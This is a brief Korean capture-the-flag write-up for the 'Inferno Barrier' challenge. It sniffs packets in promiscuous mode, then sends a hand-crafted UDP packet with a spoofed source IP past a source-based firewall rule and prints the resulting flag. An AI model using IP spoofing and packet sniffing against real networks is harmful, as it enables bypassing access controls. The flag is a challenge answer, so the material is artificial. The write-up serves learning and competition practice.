# Inferno Barrier

## Description

## Solution

`prom on` 후 `recv`를 하면 패킷 감청이 됨

```
> prom on
Promiscuous mode enabled.
> recv
Retrieving packet from receive buffer... done.
RQAAgQABAABAEfcMwKgBCsCoAQQRwShnAG2c1EFubm91bmNlbWVudDogZXJyb3I6IG5vIGFubm91bmNlbWVudCBjb25maWd1cmVkLgpSdW4gJ3NlbGVjdCAoZ2VuZXJpY3xkYXRlfHRpbWV8ZmxhZyknIHRvIGNvbmZpZ3VyZS4K
```

내용을 보면 (192.168.1.10 → 192.168.1.4 UDP 4545 → 10343)

```
Announcement: error: no announcement configured.
Run 'select (generic|date|time|flag)' to configure.
```

`select flag`를 하면 플래그를 줄 것 같음.

`192.168.1.10`으로 `select flag` UDP 패킷을 날리니까

```
> emit RQAAKAABAABAEfcMwKgBa8CoAQooZxHBABMBpXNlbGVjdCBmbGFnIA==
Adding packet to emit buffer... done.
> recv

<Firewall: (drop) 192.168.1.107:10343 -> 192.168.1.10:4545 due to policy: allow-192-168-1-4-only>
Retrieving packet from receive buffer... done.
recv buffer is empty.
```

이런 메시지가 뜨는데 source ip를 `192.168.1.4`로 바꾸면 됨

```
> emit RQAAKAABAABAEfcMwKgBBMCoAQooZxHBABMBpXNlbGVjdCBmbGFnIA==
Adding packet to emit buffer... done.
> recv
Retrieving packet from receive buffer... done.
RQAAYQABAABAEfcswKgBCsCoAQQRwShnAE0Ys0Fubm91bmNlbWVudDogaXJpc2N0Znt1ZHBfMXBfc3AwMGZpbmdfaXNfdHIxdmlhbF9idXRfdW4xZGlyM2N0MTBuYWx9Cg==
```

내용을 보면 (192.168.1.10 → 192.168.1.4 UDP 4545 → 10343)
```
Announcement: irisctf{udp_1p_sp00fing_is_tr1vial_but_un1dir3ct10nal}
```

플래그가 나옴
